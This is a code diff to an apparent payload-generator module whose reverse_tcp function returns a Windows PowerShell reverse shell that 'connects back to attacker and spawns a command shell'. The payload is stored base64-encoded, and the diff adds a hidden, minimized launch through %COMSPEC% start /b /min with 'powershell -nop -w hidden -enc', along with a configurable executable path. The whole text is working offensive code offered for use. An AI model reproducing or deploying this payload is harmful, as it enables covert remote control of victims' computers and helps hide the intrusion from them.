@@ -3,7 +3,7 @@ __all__ = ['reverse_tcp']
 import base64
 
 
-def reverse_tcp(lhost: str, lport: int):
+def reverse_tcp(lhost: str, lport: int, *, exe_path='powershell.exe'):
     """Connect back to attacker and spawn a command shell"""
 
     s = """\
@@ -12,7 +12,7 @@ cigpO2lmKCgtbm90KCRkb21haW49W0Vudmlyb25tZW50XTo6VXNlckRvbWFpbk5hbWUpKS1vcigk
 ZG9tYWluIC1lcSAkY29tcHV0ZXIpKXskZG9tYWluPScnfWVsc2V7JGRvbWFpbis9J1wnfTskdXNl
 cj0oJGRvbWFpbitbRW52aXJvbm1lbnRdOjpVc2VyTmFtZSkuVG9Mb3dlcigpO2lmKCR1c2VyIC1h
 bmQgJGNvbXB1dGVyKXsiJHVzZXJAJGNvbXB1dGVyICJ9ZWxzZXsnJ319OyRwcm9tcHQ9eyhAKCcn
-LCcxOzMxbVtyZXZdICcsJzM0bVBTICcsIjM1bSR1c2VycHJvbXB0IiwiMzRtJFBXRD4iLCdtICcp
+LCcxOzMxbSpyZXYqICcsJzM0bVBTICcsIjM1bSR1c2VycHJvbXB0IiwiMzRtJFBXRD4iLCdtICcp
 LWpvaW4gIiQoW2NoYXJdMHgxQilbIil9OyRjbGllbnQ9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNv
 Y2tldHMuVENQQ2xpZW50KCRsaG9zdCwkbHBvcnQpOyRzdHJlYW09JGNsaWVudC5HZXRTdHJlYW0o
 KTskc2VuZGJ5dGU9KFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCgmJHByb21wdCkp
@@ -30,4 +30,6 @@ O307JGNsaWVudC5DbG9zZSgpCg=="""
     for sub, repl in [('$lhost', repr(lhost)), ('$lport', str(lport))]:
         s = s.replace(sub, repl, 1)
     enc = base64.b64encode(s.encode('utf-16-le')).decode('ascii')
-    return f"powershell -nop -w hidden -e {enc!r}"
+    cmd = f'{exe_path} -nop -w hidden -enc {enc}'
+    cmd = f'%COMSPEC% /b /c start /b /min {cmd}'
+    return cmd
